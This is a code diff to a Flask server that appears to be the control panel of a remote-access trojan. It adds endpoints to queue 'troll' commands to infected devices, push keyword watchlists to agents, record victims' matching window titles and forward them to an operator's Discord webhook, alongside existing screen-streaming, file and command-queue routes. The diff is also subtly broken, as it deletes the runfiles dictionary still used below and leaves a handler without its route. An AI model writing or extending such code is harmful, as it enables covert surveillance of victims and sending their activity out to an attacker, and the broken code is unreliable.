@@ -14,7 +14,10 @@ file_requests = {}
 file_uploads = {}
 file_deletes = {}
 file_data = {}
-runfiles = {}
+winnoti = {}       # device -> list of matched window titles
+keywords = {}       # device -> list of keywords
+webhooks = {}      # device -> discord webhook url
+troll_cmds = {}
 
 @app.route('/')
 def home():
@@ -33,6 +36,13 @@ def add_device():
             d.update(data)
             return jsonify({"ok": True})
     devices.append(data)
+    return jsonify({"ok": True})
+
+@app.route('/api/devices', methods=['DELETE'])
+def remove_device():
+    name = request.args.get('name')
+    global devices
+    devices = [d for d in devices if d.get('name') != name]
     return jsonify({"ok": True})
 
 @app.route('/api/command', methods=['POST'])
@@ -169,6 +179,19 @@ def post_runfile():
     runfiles.setdefault(device, []).append(data)
     return jsonify({"ok": True})
 
+@app.route('/api/troll_cmds', methods=['GET'])
+def get_troll_cmds():
+    device = request.args.get('device')
+    cmds = troll_cmds.pop(device, [])
+    return jsonify({"cmds": cmds})
+
+@app.route('/api/troll_cmds', methods=['POST'])
+def post_troll_cmd():
+    data = request.json
+    device = data.get('device')
+    troll_cmds.setdefault(device, []).append(data)
+    return jsonify({"ok": True})
+
 @app.route('/api/frame', methods=['POST'])
 def upload_frame():
     data = request.json
@@ -193,5 +216,59 @@ def stream(device):
         return jsonify({"image": img})
     return jsonify({"image": None})
 
+@app.route('/api/keywords', methods=['GET'])
+def get_keywords():
+    device = request.args.get('device')
+    return jsonify({"keywords": keywords.get(device, [])})
+
+@app.route('/api/keywords', methods=['POST'])
+def set_keywords():
+    data = request.json
+    device = data.get('device')
+    kws = data.get('keywords', [])
+    keywords[device] = kws
+    # send command to agent via command queue
+    commands.setdefault(device, []).append("setkeywords:" + "\n".join(kws))
+    return jsonify({"ok": True})
+
+import urllib.request
+import json as _json
+
+@app.route('/api/webhook', methods=['GET'])
+def get_webhook():
+    device = request.args.get('device')
+    return jsonify({"webhook": webhooks.get(device, "")})
+
+@app.route('/api/webhook', methods=['POST'])
+def set_webhook():
+    data = request.json
+    device = data.get('device')
+    url = data.get('webhook', '')
+    webhooks[device] = url
+    return jsonify({"ok": True})
+def get_winnoti():
+    device = request.args.get('device')
+    return jsonify({"notifications": winnoti.get(device, [])})
+
+@app.route('/api/winnoti', methods=['POST'])
+def post_winnoti():
+    data = request.json
+    device = data.get('device')
+    title = data.get('title', '')
+    winnoti.setdefault(device, []).append(title)
+    # keep last 50
+    if len(winnoti[device]) > 50:
+        winnoti[device] = winnoti[device][-50:]
+    wh = webhooks.get(device, '')
+    if wh:
+        try:
+            payload = _json.dumps({"content": f"Window match on {device}: {title}"}).encode()
+            req = urllib.request.Request(wh, data=payload, headers={"Content-Type": "application/json"})
+            urllib.request.urlopen(req, timeout=5)
+        except Exception:
+            pass
+    return jsonify({"ok": True})
+
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=10000)
+```
